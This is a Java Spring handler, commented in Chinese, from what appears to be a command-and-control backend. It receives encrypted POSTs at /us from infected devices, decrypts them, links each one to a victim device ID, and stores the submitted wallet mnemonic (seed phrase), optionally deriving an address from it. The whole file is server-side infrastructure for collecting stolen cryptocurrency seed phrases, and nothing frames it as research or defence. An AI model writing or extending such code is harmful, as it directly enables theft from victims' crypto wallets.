package com.consume.service.handlers;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;
import com.consume.service.AbstractC2Handler;

/**
 * POST /us：助记词（XADD.md §5.4）。
 *
 * 解密 → save_event_decrypt → save_mnemonic（加密存，可能派生 address4）→ 关联 c2_records.device_id。
 * 重复助记词会记 dup（由 store 处理）。
 */
@Component
public class HandleUs extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Override
    public String path() {
        return "/us";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /us 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);
        String plain = decrypt(ctx, "result", "d", "f", "u", "d3");

        if (plain.isEmpty()) {
            log.info("异常日志:[c2_handlers] /us 解密失败，跳过业务, id={}", ctx.getRecordId());
            store.saveEventDecrypt(ctx, plain, ctx.getKeyLabel());
            return;
        }

        String d = ctx.plaintextStr("d");
        String f = ctx.plaintextStr("f");
        String u = ctx.plaintextStr("u");
        Long rowId = deviceResolver.resolveAndLink(ctx, d, f, u, null, null);

        store.saveEventDecrypt(ctx, plain, ctx.getKeyLabel());
        if (rowId == null) {
            log.info("异常日志:[c2_handlers] /us 无设备，跳过 mnemonic, id={}, deviceid={}",
                    ctx.getRecordId(), ctx.getDeviceId());
            return;
        }
        store.saveMnemonic(ctx, ctx.getPlaintext());

        log.info("正常日志:[c2_handlers] call handle_us 完成, id={}, deviceRowId={}, deviceid={}",
                ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId());
    }
}
